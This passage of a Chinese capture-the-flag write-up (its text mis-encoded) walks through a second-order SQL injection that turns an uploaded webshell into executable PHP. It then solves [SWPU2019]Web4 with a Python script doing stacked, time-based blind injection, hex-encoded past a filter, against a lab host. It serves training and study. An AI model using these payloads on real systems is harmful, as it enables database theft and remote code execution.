		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$oldname</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token comment">//é‡å‘½åæ–‡ä»¶å’Œç›®å½•</span>
			<span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$oldname</span><span class="token punctuation">,</span> <span class="token variable">$newname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;/&quot;</span> <span class="token punctuation">.</span> <span class="token variable">$newname</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;Your file is rename, url:
                &lt;a href=\&quot;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$url</span><span class="token punctuation">}</span></span>\&quot; target='_blank'&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$url</span><span class="token punctuation">}</span></span>&lt;/a&gt;&lt;br/&gt;
                &lt;a href=\&quot;/\&quot;&gt;go back&lt;/a&gt;&quot;</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>file manage<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>/<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>utf-8<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>Rename<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>old filename(exclude extension)ï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>oldname<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>new filename(exclude extension)ï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>newname<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>rename<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br></div></div><p>upload.phpä¸­å¯¹ä¼ å…¥æ•°æ®åº“ä¸­å­—ç¬¦åšäº†è½¬ä¹‰å¤„ç†ï¼Œä½†æ˜¯åœ¨rename.phpä¸­å†æ¬¡å¼•ç”¨æ•°æ®åº“ä¸­çš„æ•°æ®çš„æ—¶å€™æ²¡æœ‰è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼Œå¼•å‘äº†äºŒæ¬¡æ³¨å…¥ã€‚</p> <p>ä¸Šä¼ webshell<code>',extension='.png</code>ï¼Œåœ¨rename.phpä¸­è¿›è¡Œé‡å‘½åï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727202706.png" alt="image-20200727202706692"></p> <p>è¿™æ ·ç»è¿‡æ‹¼æ¥ä¹‹åçš„sqlè¯­å¥ä¸ºï¼š</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">update</span> <span class="token punctuation">`</span><span class="token keyword">file</span><span class="token punctuation">`</span> <span class="token keyword">set</span> <span class="token punctuation">`</span>filename<span class="token punctuation">`</span><span class="token operator">=</span><span class="token string">'12png'</span><span class="token punctuation">,</span> <span class="token punctuation">`</span>oldname<span class="token punctuation">`</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>extension<span class="token operator">=</span><span class="token string">''</span> <span class="token keyword">where</span> <span class="token punctuation">`</span>fid<span class="token punctuation">`</span> <span class="token operator">=</span> <span class="token punctuation">`</span>{fid}<span class="token punctuation">`</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>é‡å‘½åæˆåŠŸï¼Œå¹¶å°†æ–‡ä»¶12pngçš„extensionå­—æ®µç½®ä¸ºç©ºï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727202941.png" alt="image-20200727202941339"></p> <p>æ­¤æ—¶å¦‚æœå†å°†12pngé‡å‘½åä¸º12phpï¼Œå› ä¸ºextensionå­—æ®µä¸ºç©ºï¼Œæ‰€ä»¥newname=12phpï¼Œçœ‹ä¼¼å¯ä»¥å†™å…¥ä¸€ä¸ªWebshellï¼Œä½†æ˜¯ç›´æ¥é‡å‘½ååªæ˜¯ä¿®æ”¹äº†æ•°æ®åº“ä¸­æ•°æ®ï¼Œå¹¶æ²¡æœ‰å¯¹æ–‡ä»¶åšå®è´¨æ€§çš„æ”¹åŠ¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå°½ç®¡æ•°æ®åº“ä¸­çš„æ•°æ®æ˜¯12phpï¼Œä½†æ˜¯åœ¨ä¸Šä¼ ç›®å½•ä¸‹çš„æ–‡ä»¶åä¾ç„¶æ˜¯12pngï¼ŒåŸå› å¦‚ä¸‹ï¼š</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token comment">//rename.php</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$oldname</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token comment">//é‡å‘½åæ–‡ä»¶å’Œç›®å½•</span>
		<span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$oldname</span><span class="token punctuation">,</span> <span class="token variable">$newname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>åªæœ‰æ»¡è¶³$oldnameå­˜åœ¨ï¼Œæ‰å¯ä»¥è¿›è¡Œå®è´¨æ€§çš„æ–‡ä»¶é‡å‘½åï¼Œä¹Ÿå°±æ˜¯è¯´è¿˜éœ€è¦é¢å¤–ä¸Šä¼ ä¸€ä¸ªåŒåçš„Webshellï¼Œæ¥æ»¡è¶³è¿™ä¸ªifæ¡ä»¶ï¼Œåœ¨ä¸Šä¼ è¿‡ç¨‹ä¸­å¹¶ä¸ä¼šæŠ¥<code>file is exists</code>çš„é”™è¯¯ï¼Œå…·ä½“åŸå› å¦‚ä¸‹ï¼š</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>//upload.php

//å°†æ–‡ä»¶ä¿¡æ¯å­˜å…¥æ•°æ®åº“çš„sqlè¯­å¥
$sql = &quot;insert into `file` ( `filename`, `view`, `extension`) values( '{$path_parts['filename']}', 0, '{$path_parts['extension']}')&quot;;

//æˆ‘ä»¬ä¸Šä¼ 12pngï¼Œè¿™ä¸ªæ–‡ä»¶çš„extensionä¼šè¢«è§£æä¸ºpngï¼Œæˆ‘ä»¬ä¹‹å‰ä¸Šä¼ çš„æ–‡ä»¶extensionå­—æ®µå·²ç»è¢«ç½®ä½ç©ºï¼Œæ‰€ä»¥å°½ç®¡ä¸¤ä¸ªæ–‡ä»¶çš„æ–‡ä»¶åç›¸åŒï¼Œä½†æ˜¯æœ¬è´¨ä¸Šå¹¶ä¸é‡åã€‚

//æ›´ç›´è§‚ä¸€ç‚¹ï¼Œåœ¨æ•°æ®è¡¨çš„å­—æ®µä¿¡æ¯åˆ†åˆ«ä¸ºï¼š

|fid|filename|oldname|view|extension|
| 1 |12png |       |  0 |         |
| 2 |123     |       |  0 |   png   |
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>è¿™æ ·ä¸€æ¥ï¼Œ12pngå°±å¯ä»¥è¢«é‡å‘½ä¸º12phpï¼ŒWebshellå†™å…¥æˆåŠŸï¼š</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727204856.png" alt="image-20200727204856896"> <p>RCEéšä¾¿æ‰“ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727205545.png" alt="image-20200727205507754"></p> <h3 id="swpu2019-web4"><a href="#swpu2019-web4" class="header-anchor">#</a> [SWPU2019]Web4</h3> <p><strong>è€ƒç‚¹ï¼š</strong></p> <ul><li><strong>SQLæ³¨å…¥ï¼ˆtime basedã€å †å æ³¨å…¥ï¼‰</strong></li> <li><strong>ä»£ç å®¡è®¡</strong></li></ul> <p>é¢˜ç›®ç»™äº†ä¸€ä¸ªç™»å½•æ¡†ï¼Œå¦‚æœç‚¹å‡»æ³¨å†ŒåŠŸèƒ½çš„è¯ä¼šå¼¹çª—æ³¨å†ŒåŠŸèƒ½æœªå¼€æ”¾ï¼›å¦‚æœéšä¾¿è¾“ç”¨æˆ·åç‚¹ç™»å½•çš„è¯æ²¡æœ‰ååº”ï¼ŒæŠ“åŒ…çœ‹çœ‹ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201004211419.png" alt="image-20201004205858933"></p> <p><code>username</code>å’Œ<code>password</code>æ˜¯ç”¨jsonæ ¼å¼å‘é€çš„ï¼Œå¹¶ä¸”ä¼šè¿”å›ä¸€æ®µä¿¡æ¯ã€‚å…ˆæµ‹è¯•æœ‰æ²¡æœ‰æ³¨å…¥ç‚¹ï¼šæˆ‘åœ¨<code>username</code>åé¢æ·»åŠ äº†ä¸€ä¸ªå¼•å·ï¼Œå¼•å‘äº†æŠ¥é”™ï¼Œä½†æ˜¯è¿™ä¸ªæŠ¥é”™æ˜¯phpçš„æŠ¥é”™ï¼Œä¸æ˜¯Mysqlçš„æŠ¥é”™ï¼Œæ‰€ä»¥æ— æ³•è¿›è¡ŒæŠ¥é”™æ³¨å…¥</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201004211412.png" alt="image-20201004210120510"></p> <p>ç»è¿‡ç®€å•çš„æ‰‹åŠ¨fuzzä¹‹åå‘ç°æ²¡æœ‰åŠæ³•è¿›è¡Œè”åˆæŸ¥è¯¢ï¼ˆå› ä¸ºæ²¡æœ‰å›æ˜¾ï¼‰å’Œæœ‰Booleanå›æ˜¾çš„ç›²æ³¨ï¼Œæˆ‘çŒœå¯èƒ½æ˜¯æœåŠ¡å™¨å…¨ç»™WAFæ‰äº†ï¼Œä¸€èˆ¬è¿™ç§æƒ…å†µä¸‹å¯ä»¥è€ƒè™‘ä»¥ä¸‹å †å æ³¨å…¥ï¼Œæ‰€ä»¥æˆ‘ä¿®æ”¹<code>username</code>ä¸º<code>123';</code>ï¼Œç»“æœå‘ç°å›æ˜¾æ­£å¸¸ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201004211403.png" alt="image-20201004210409621"></p> <p>è¿™æ ·ä¸€æ¥ï¼Œæ‹¼æ¥åˆ°æœåŠ¡å™¨ç«¯çš„SQLè¯­å¥å°±æ˜¯ï¼š</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> {table_name} <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'123'</span><span class="token punctuation">;</span><span class="token string">' and password='</span><span class="token number">123</span>'
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>å› ä¸º<code>;</code>å·è¡¨ç¤ºä¸€ä¸ªSQLè¯­å¥çš„ç»“æŸï¼Œ<code>;</code>å·åé¢çš„ä¸€ä¸ª<code>'</code>å·è¢«è®¤ä¸ºæ˜¯ä¸‹ä¸€ä¸ªSQLè¯­å¥çš„å¼€å§‹ï¼Œæ‰€ä»¥æ²¡æœ‰äº§ç”ŸæŠ¥é”™ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªé¢˜ç›®æ˜¯å­˜åœ¨å †å æ³¨å…¥çš„ï¼ˆ<code>;</code>å·è¢«è§£æäº†ï¼‰ã€‚</p> <p>é¢˜ç›®æ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•ä½¿ç”¨æ—¶é—´ç›²æ³¨ + å †å æ³¨å…¥æ¥è¿›è¡Œæ³¨å…¥ï¼Œä¸‹é¢æ˜¯ç®€å•çš„æ¼”ç¤ºï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201004211142.png" alt="image-20201004211142245"></p> <p>å¦å¤–å¯ä»¥æŠŠSQLè¯­å¥è¿›è¡Œhexè½¬æ¢æ¥ç»•è¿‡WAFï¼ˆåœ¨MySQLä¸­0xå¼€å¤´çš„åå…­è¿›åˆ¶æ•°ä¼šè¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼‰ï¼Œä¸‹é¢è´´ä¸Šæˆ‘çš„è„šæœ¬ï¼š</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> json


<span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">]</span><span class="token punctuation">)</span>


url <span class="token operator">=</span> <span class="token string">'http://14404d01-74ee-411a-b1c3-bc37abb07bd1.node3.buuoj.cn/index.php?r=Login/Login'</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># temp_payload = 'select if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))&gt;{}),1,sleep(3))'.format(str(i), str(j))</span>
        <span class="token comment"># table: flag</span>
        <span class="token comment"># temp_payload = &quot;select if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag'),{},1))&gt;{}),1,sleep(3))&quot;.format(str(i), str(j))</span>
        <span class="token comment"># cloumn: flag</span>
        temp_payload <span class="token operator">=</span> <span class="token string">&quot;select if((ascii(substr((select group_concat(flag) from flag),{},1))&gt;{}),1,sleep(3))&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
        payload <span class="token operator">=</span> <span class="token string">&quot;1';set @a=0x&quot;</span> <span class="token operator">+</span> str_to_hex<span class="token punctuation">(</span>temp_payload<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;;prepare inj from @a;execute inj -- &quot;</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;username&quot;</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>
            <span class="token string">&quot;password&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;123456&quot;</span>
        <span class="token punctuation">}</span>
        data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>seconds<span class="token punctuation">)</span>
        <span class="token keyword">if</span> res<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>seconds <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
            flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br></div></div><p>æœ€åå¾—åˆ°äº†å¦‚ä¸‹ç»“æœï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201004211336.png" alt="image-20201004211336213"></p> <p>æ‹¿åˆ°æºç </p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201004211549.png" alt="image-20201004211549551"></p> <p>æ˜¯ä¸€ä¸ªç®€å•çš„MVCæ¡†æ¶ï¼Œ<code>fun.php</code>ä¸­å¯¹ä¼ å…¥çš„<code>r</code>å‚æ•°è¿›è¡Œäº†ç›¸åº”çš„å¤„ç†ï¼š</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token comment">// è·¯ç”±æ§åˆ¶è·³è½¬è‡³æ§åˆ¶å™¨</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$controller</span><span class="token punctuation">,</span><span class="token variable">$action</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$r</span><span class="token punctuation">;</span>
	<span class="token variable">$controller</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$controller</span><span class="token punctuation">}</span></span>Controller&quot;</span><span class="token punctuation">;</span>
	<span class="token variable">$action</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;action<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$action</span><span class="token punctuation">}</span></span>&quot;</span><span class="token punctuation">;</span>


	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$controller</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$controller</span><span class="token punctuation">,</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token comment">//</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span>
		<span class="token punctuation">{</span>
			<span class="token variable">$action</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;actionIndex&quot;</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span>
	<span class="token punctuation">{</span>
		<span class="token variable">$controller</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;LoginController&quot;</span><span class="token punctuation">;</span>
        <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;actionIndex&quot;</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token variable">$controller</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Location:index.php?r=Login/Index&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br></div></div><p>å®¡è®¡çš„è¿‡ç¨‹æˆ‘å°±ä¸è¯¦ç»†è¯´äº†ï¼Œå°±ç®€å•è¯´ä¸€ä¸‹å…³é”®çš„åœ°æ–¹ï¼šåœ¨<code>BaseController.php</code>ä¸­ä¼šæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­ä¼šå¯¹<code>viewData</code>è¿›è¡Œ<code>extract</code>å¤„ç†ï¼Œè¿™é‡Œæ˜¯ä¼šé€ æˆå˜é‡è¦†ç›–çš„ã€‚</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code># BaseController.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 

<span class="token comment">/**
* æ‰€æœ‰æ§åˆ¶å™¨çš„çˆ¶ç±»
*/</span>
<span class="token keyword">class</span> <span class="token class-name">BaseController</span>
<span class="token punctuation">{</span>
	<span class="token comment">/*
	 * åŠ è½½è§†å›¾æ–‡ä»¶
	 * viewName è§†å›¾åç§°
	 * viewData è§†å›¾åˆ†é…æ•°æ®
	*/</span>
	<span class="token keyword">private</span> <span class="token variable">$viewPath</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">loadView</span><span class="token punctuation">(</span><span class="token variable">$viewName</span> <span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$viewData</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
